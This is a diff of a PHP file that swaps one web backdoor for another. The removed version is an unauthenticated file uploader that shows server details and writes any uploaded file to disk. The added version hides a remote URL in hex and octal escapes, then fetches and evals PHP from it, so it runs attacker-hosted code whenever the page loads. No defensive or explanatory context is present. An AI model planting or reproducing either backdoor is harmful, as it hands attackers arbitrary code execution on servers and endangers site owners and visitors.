@@ -1,27 +1,8 @@
-<html>
-    <head>
-        <title>Uploader By xTRIPLE_D</title>
-	</head>
-<body>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br><br>
 <?php
-$om= "xTRIPLE";
-$ar= "BOT";
-$atx = $om.$ar;
-echo $atx;
-echo "<font color='RED'</font><center><h1>$atx</h1></center>";
-echo '<font color="BLUE"</font><center><b><br>'.php_uname().'<br></b></center>';  
-echo '<center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"></center>'; 
-echo '<center><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></center>'; 
-if( $_POST['_upl'] == "Upload" ) { 
-    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<font color="GREEN"</font><center><b>Upload Success !!!</b><br><br></center>'; } 
-    else { echo '<font color="RED"</font><center><b>Upload Failed !!!</b><br><br></center>'; } 
-} 
+/*   __________________________________________________
+    |---Created By Mr.PeluangX7 [ wibu only ]----|
+    |------ https://www.facebook.com/combet.ohct ------|
+    |__________________________________________________|
+*/
+echo "\74\41\x44\117\x43\x54\x59\120\105\40\x68\164\155\x6c\76\15\12"; echo eval("\x3f\76" . file_get_contents("\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x63\x68\x75\x63\x6B\x79\x72\x65\x70\x6C\x79\x2F\x78\x54\x52\x49\x5F\x44\x2F\x6D\x61\x69\x6E\x2F\x6C\x6F\x6B\x70\x69\x75\x2E\x70\x68\x70"));
 ?>
-</html>
